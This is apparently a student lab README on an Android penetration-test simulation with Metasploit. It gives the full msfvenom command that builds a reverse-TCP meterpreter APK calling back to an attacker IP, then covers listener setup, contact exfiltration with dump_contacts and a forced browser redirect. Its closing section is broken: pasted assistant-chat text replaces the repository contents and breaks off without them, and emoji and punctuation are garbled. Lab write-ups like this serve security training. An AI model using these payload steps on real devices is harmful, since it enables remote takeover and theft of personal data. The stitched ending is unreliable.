# üõ°Ô∏è Mobile Application Security Testing (Android) ‚Äî Metasploit Analysis  
**Author:** Aman Sharma  
**Role:** Penetration Tester (Simulation)

## üìò Overview  
This project demonstrates a hands-on simulation of a **Mobile Application Penetration Test** on an Android target. The focus was to simulate an attacker exploiting a compromised device to exfiltrate sensitive data and manipulate user activity.

The goal was to utilize the **Metasploit Framework** to showcase core offensive security skills, including payload generation, listener configuration, and post-exploitation activities, directly correlating findings to common mobile security vulnerabilities like **Insecure Data Storage** and **Weak Authentication**.

## üß© Project Phases

### **Phase 1 ‚Äî Payload Generation and Listener Setup**
- Created a malicious Android Application Package (`.apk`) using **`msfvenom`** with a **`android/meterpreter/reverse_tcp`** payload.
- Configured the payload to call back to the Kali Linux attacker machine (`LHOST=192.168.66.133`, `LPORT=4444`).
- Setup the corresponding listener using the **`exploit/multi/handler`** module in Metasploit.

**Outcome:** Successfully generated the malicious APK (`viruss.apk`) and established a persistent C2 session upon the application's execution on the target Android emulator.

  *Command: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.66.133 LPORT=4444 -o viruss.apk*
</p>

---

### **Phase 2 ‚Äî Remote Session Establishment**
- Transferred and executed the payload (`viruss.apk`) on the target Android Emulator (NoxPlayer 7.0.6.2).
- Successfully caught the reverse connection on the Kali machine.

**Outcome:** A **Meterpreter Session 1** was opened from the target IP (`192.168.66.1`) to the attacker, granting remote shell access and control.

  <br>
  *The reverse TCP handler catches the connection on LPORT 4444.*
</p>

---

### **Phase 3 ‚Äî Post-Exploitation: Data Exfiltration (Contacts)**
- Executed the **`dump_contacts`** command to access and exfiltrate the device's PII.
- The command fetched the contact list from the target's database.

**Outcome:** Successfully extracted contact names and numbers, saving them locally to a text file. This demonstrated a critical **Insecure Data Storage** vulnerability.

  <br>
  *Command: dump_contacts. Result: Contacts list saved, showing insecure storage.*
</p>

---

### **Phase 4 ‚Äî Post-Exploitation: Activity Injection (Phishing)**
- Executed the **`activity_start`** command to manipulate the user interface on the target device.
- Forced the device to launch a web browser and navigate to a specific URL (`https://www.facebook.com`).

**Outcome:** Demonstrated the ability to launch phishing attacks or forced redirects, showcasing the risk associated with lack of **Intent Validation**.

## üìÅ Repository Contents
That makes perfect sense. You want to adjust the Repository Contents section because you don't have the final PDF report yet, and you want to embed a few key images directly into the README.md to make the project visually engaging right away.

I have updated the README.md content for you. I've embedded the three most critical images directly into the relevant phases:

Payload Creation (The setup)

Session Established (The compromise)

Data Dump (The result)

I also removed the mention of the PDF file from the Repository Contents and the header.

Here is the revised, ready-to-use README.md content:
